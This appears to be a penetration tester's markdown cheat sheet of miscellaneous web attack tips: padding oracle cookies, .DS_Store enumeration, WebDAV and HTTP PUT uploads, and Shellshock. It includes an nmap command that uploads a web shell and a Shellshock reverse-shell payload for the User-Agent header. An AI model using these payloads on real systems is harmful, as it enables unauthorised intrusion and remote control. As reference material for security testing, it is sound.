# Misc

## session cookies

If server errors on wrong cookie,the sessions id might be vulnerable to padding oracle attacks, which we can test with padbuster or gobuster

## dsstore

DSStore Files are placed when apple device access shares. If they happen to be on a webserver we can use them to enumerate the filesystem with [ds_storescanner](
https://github.com/internetwache/ds_storescanner)

## other

* if all responses are forbidden on web discovery try different request methods

## http-put

```bash cheat put upload file with http put
nmap -Pn -n -p 80 --script=http-put.nse --script-args http-put.file='shell.aspx',http-put.url='/shell.aspx' <ip>
```

## webdav

Test which permissions we have and which filetypes can be uploaded (this creates a lot of junk on the server if its vulnerable):
`davtest -url <url>`

If a certain extension is blocked for uploading you might be able to upload a harmless extension and then rename it to the one you want with `move`.

Use cadaver to connect and upload:
`cadaver <ip> && put <filename>`

## shellshock

In user agent: 
```bash cheat shellshock shellshock in user agent
() { :; }; bash -i >& /dev/tcp/<ip>/<port> 0>&1
```

tags: #misc #cookies #session #shellshock 
